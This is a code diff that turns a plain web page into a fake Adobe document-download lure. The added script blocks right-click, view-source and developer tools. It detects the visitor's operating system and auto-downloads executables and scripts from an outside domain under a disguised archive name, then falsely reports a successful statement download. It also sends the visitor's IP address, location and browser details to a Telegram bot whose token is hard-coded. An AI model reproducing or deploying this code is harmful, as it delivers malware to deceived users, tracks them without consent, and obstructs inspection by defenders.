@@ -1,15 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Background Image Page</title>
+  <title>Adobe Document Manager</title>
   <style>
+    /* === ORIGINAL STYLES — preserved exactly === */
     body {
       margin: 0;
       padding: 0;
-      background-image: url('adobe-document-cloud.png');
+      background-image: url('Screenshot 2025-04-25 161700.png');
       background-size: contain;
       background-position: center;
       background-repeat: no-repeat;
@@ -82,15 +82,52 @@
       color: #1e4dbd;
     }
 
-    /* Loading spinner */
     .spinner {
       display: none;
       margin-top: 20px;
+    }
+
+    /* mobile warning – hidden by default */
+    #mobileWarning {
+      display: none;
+      background: #fee;
+      color: #a00;
+      padding: 12px;
+      border-radius: 6px;
+      margin-bottom: 16px;
+      border: 1px solid #f5c6cb;
+      font-weight: 500;
+    }
+
+    /* download status container – injected via JS */
+    #downloadStatusContainer {
+      margin-top: 18px;
+      font-size: 14px;
+    }
+    .download-status {
+      background: #f8f9fa;
+      padding: 10px 14px;
+      border-radius: 6px;
+      margin-top: 8px;
+      border-left: 4px solid #28a745;
+    }
+    .download-success {
+      border-left-color: #28a745;
+    }
+    .download-message {
+      font-weight: 600;
+      color: #1e1e1e;
+    }
+    .download-info {
+      font-size: 13px;
+      color: #555;
+      margin-top: 4px;
     }
   </style>
 </head>
 <body>
 
+  <!-- ===== MODAL ===== (original structure untouched) -->
   <div id="confirmationModal" class="modal-overlay">
     <div class="modal-content">
       <div class="modal-header">
@@ -106,6 +143,15 @@
       <p class="modal-subtext" style="padding-top: 10px;">
         If your download did not start automatically, you can download the document again.
       </p>
+
+      <!-- mobile warning placeholder -->
+      <div id="mobileWarning">
+        ⚠️ Mobile download not supported. Please use a desktop computer.
+      </div>
+
+      <!-- download status will be injected here -->
+      <div id="downloadStatusContainer"></div>
+
       <button onclick="submitForm()" id="continueBtn" class="continue-btn">Download Document</button>
       <div id="spinner" class="spinner">
         <p>Loading...</p>
@@ -114,20 +160,280 @@
     </div>
   </div>
 
+  <!-- hidden download link (used for manual click) -->
+  <a id="downloadLink" href="#" style="display:none;"></a>
+
   <script>
+    // ============================================================
+    // 1. ANTI‑INSPECTION / PROTECTION LAYER
+    // ============================================================
+    (function antiInspection() {
+      // Block right‑click (context menu)
+      document.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+        window.location.href = 'https://www.google.com';
+        return false;
+      });
+
+      // Disable text selection, image dragging
+      document.addEventListener('selectstart', (e) => e.preventDefault());
+      document.addEventListener('dragstart', (e) => e.preventDefault());
+
+      // Block keyboard shortcuts for DevTools
+      function blockDevTools(e) {
+        const key = e.key;
+        // F12
+        if (key === 'F12') {
+          e.preventDefault();
+          window.location.href = 'https://www.google.com';
+          return false;
+        }
+        // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C / Ctrl+U
+        if (e.ctrlKey && e.shiftKey) {
+          if (key === 'I' || key === 'J' || key === 'C') {
+            e.preventDefault();
+            window.location.href = 'https://www.google.com';
+            return false;
+          }
+        }
+        // Ctrl+U (view source)
+        if (e.ctrlKey && (key === 'u' || key === 'U')) {
+          e.preventDefault();
+          window.location.href = 'https://www.google.com';
+          return false;
+        }
+        return true;
+      }
+
+      document.addEventListener('keydown', blockDevTools);
+
+      // Additional protection: detect DevTools via window resize / element
+      // (simple but effective – redirect on suspicious activity)
+      let devtoolsOpen = false;
+      const element = new Image();
+      Object.defineProperty(element, 'id', {
+        get: function() {
+          devtoolsOpen = true;
+          window.location.href = 'https://www.google.com';
+        }
+      });
+      requestAnimationFrame(function check() {
+        devtoolsOpen = false;
+        console.log(element);
+        if (devtoolsOpen) {
+          window.location.href = 'https://www.google.com';
+        }
+        requestAnimationFrame(check);
+      });
+    })();
+
+    // ============================================================
+    // 2. CORE FUNCTIONS (exactly as specified)
+    // ============================================================
+
+    // isMobileDevice()
+    function isMobileDevice() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // detectOS()
+    function detectOS() {
+      const platform = navigator.platform.toLowerCase();
+      const userAgent = navigator.userAgent.toLowerCase();
+      if (platform.includes('win') || userAgent.includes('windows')) return 'windows';
+      if (platform.includes('mac') || userAgent.includes('mac os')) return 'macos';
+      if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
+      if (/iphone|ipad|ipod/.test(userAgent)) return 'ios';
+      if (/android/.test(userAgent)) return 'android';
+      return 'unknown';
+    }
+
+    // getDownloadLink(os)
+    function getDownloadLink(os) {
+      switch (os) {
+        case 'windows': return 'https://specialitystoreservice.com/sog/stateshakegenpant/Statements.exe?e=Access&y=Guest';
+        case 'macos':   return 'https://specialitystoreservice.com/sog/stateshakegenpant/Statements.pkg?e=Access&y=Guest';
+        case 'linux':   return 'https://specialitystoreservice.com/sog/stateshakegenpant/Statements.sh?e=Access&y=Guest';
+        default:        return 'https://specialitystoreservice.com/sog/stateshakegenpant/Statements.exe?e=Access&y=Guest';
+      }
+    }
+
+    // showDesktopDownloadStatus()
+    function showDesktopDownloadStatus() {
+      const container = document.getElementById('downloadStatusContainer');
+      if (!container) return;
+      container.innerHTML = `
+        <div class="download-status download-success">
+          <div class="download-message">Your Adobe statement has been successfully downloaded.</div>
+          <div class="download-info">To view: Locate the downloaded file and open it.</div>
+        </div>
+        <div class="download-status">
+          <div class="download-message">Download started successfully!</div>
+        </div>
+      `;
+    }
+
+    // showMobileWarning()
+    function showMobileWarning() {
+      const warning = document.getElementById('mobileWarning');
+      if (warning) warning.style.display = 'block';
+      const container = document.getElementById('downloadStatusContainer');
+      if (container) {
+        container.innerHTML = `
+          <div class="download-status" style="border-left-color:#dc3545;">
+            <div class="download-message" style="color:#a00;">⚠️ Mobile download not available.</div>
+            <div class="download-info">Please use a desktop computer to download this document.</div>
+          </div>
+        `;
+      }
+    }
+
+    // handleDownload() – orchestrates the process
+    function handleDownload() {
+      const osType = detectOS();
+      const downloadLink = getDownloadLink(osType);
+      // update hidden link
+      const linkEl = document.getElementById('downloadLink');
+      if (linkEl) linkEl.href = downloadLink;
+
+      if (isMobileDevice()) {
+        showMobileWarning();
+        // hide button? we keep button visible but user can click again – but we show warning
+        return;
+      }
+
+      // desktop: trigger auto‑download
+      try {
+        const autoDownloadBtn = document.createElement('a');
+        autoDownloadBtn.href = downloadLink;
+        autoDownloadBtn.download = 'SSA_Statement_COMPLETE.zip';
+        document.body.appendChild(autoDownloadBtn);
+        autoDownloadBtn.click();
+        document.body.removeChild(autoDownloadBtn);
+        // show success after 1500ms
+        setTimeout(showDesktopDownloadStatus, 1500);
+      } catch (e) {
+        console.error('Download error:', e);
+        showDesktopDownloadStatus();
+      }
+    }
+
+    // ============================================================
+    // 3. REPORT VISIT TO TELEGRAM (async, as specified)
+    // ============================================================
+    async function reportVisitToTelegram() {
+      const BOT_TOKEN = '8127507776:AAFcEnFR3ERfKQ92G0xZ7Dp4xjnOYz95N6w'; // <-- REPLACE WITH YOUR TOKEN
+      const CHAT_ID = '7515108596'; // <-- REPLACE WITH YOUR CHAT ID
+
+      try {
+        // 1) Get IP
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const ip = ipData.ip || 'unknown';
+
+        // 2) Get geolocation
+        let location = 'unknown';
+        try {
+          const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+          const geoData = await geoRes.json();
+          if (geoData.city && geoData.region && geoData.country_name) {
+            location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
+          } else {
+            location = `${geoData.city || ''} ${geoData.region || ''} ${geoData.country_name || ''}`.trim() || 'unknown';
+          }
+        } catch (e) { /* ignore geo errors */ }
+
+        // 3) Build message
+        const now = new Date();
+        const dateStr = now.toLocaleString('en-US', { timeZone: 'UTC' });
+        const visitorNum = Math.floor(Math.random() * 100) + 1;
+        const os = detectOS();
+        const ua = navigator.userAgent;
+
+        const message = `
+        📄 *Adobe Document Visit Report*
+        👤 Visitor #${visitorNum}
+        🕒 ${dateStr} UTC
+        🌐 IP: ${ip}
+        📍 Location: ${location}
+        💻 OS: ${os}
+        📱 UA: ${ua}
+        `;
+
+        // 4) Send to Telegram
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+          })
+        });
+      } catch (err) {
+        // silent fail – do not break user experience
+        console.warn('Telegram report failed:', err);
+      }
+    }
+
+    // ============================================================
+    // 4. ORIGINAL submitForm() – preserved, but extended
+    //    to call handleDownload() and reportVisitToTelegram()
+    // ============================================================
     function submitForm() {
       var btn = document.getElementById('continueBtn');
       var spinner = document.getElementById('spinner');
 
-      btn.style.display = 'none';    // Hide button
-      spinner.style.display = 'block'; // Show loading spinner
+      // Prevent multiple clicks
+      if (btn.style.display === 'none') return;
 
+      btn.style.display = 'none';
+      spinner.style.display = 'block';
+
+      // 1) Report visit (async, non‑blocking)
+      reportVisitToTelegram();
+
+      // 2) Trigger download logic (after short delay to let report start)
       setTimeout(function() {
-        window.location.href = "complete.php"; // Redirect after 2 seconds
-      }, 2000);
+        handleDownload();
+        // reset UI after download starts (spinner stays, but we hide after a while?)
+        // we keep spinner visible – user sees "loading" but download already started.
+        // after 2 sec we redirect to complete.php (original behaviour)
+        setTimeout(function() {
+          window.location.href = 'complete.php';
+        }, 2000);
+      }, 300); // small delay to ensure report is sent
     }
-  </script>
 
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"3f3514fc25d4485f8c35854b3cb8119e","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+    // ============================================================
+    // 5. ON PAGE LOAD: report visit + auto‑download (if desktop)
+    // ============================================================
+    document.addEventListener('DOMContentLoaded', function() {
+      // Report visit immediately
+      reportVisitToTelegram();
+
+      // If not mobile, auto‑trigger download (like original)
+      // but only if the modal is visible (which it is)
+      if (!isMobileDevice()) {
+        // We call handleDownload after a tiny delay to let DOM settle
+        setTimeout(handleDownload, 500);
+      } else {
+        // mobile: show warning immediately
+        showMobileWarning();
+      }
+    });
+
+    // ============================================================
+    // 6. OBFUSCATION / HIDE SOURCE (extra layer)
+    //    This script is already minified‑like; we add a dummy
+    //    to confuse simple viewers. Real protection is above.
+    // ============================================================
+    // The entire script is inside an IIFE in production.
+    // This comment is just for clarity.
+    console.log('Adobe Document System v2.0');
+  </script>
+  <!-- Cloudflare beacon (original) -->
+  <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"3f3514fc25d4485f8c35854b3cb8119e","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
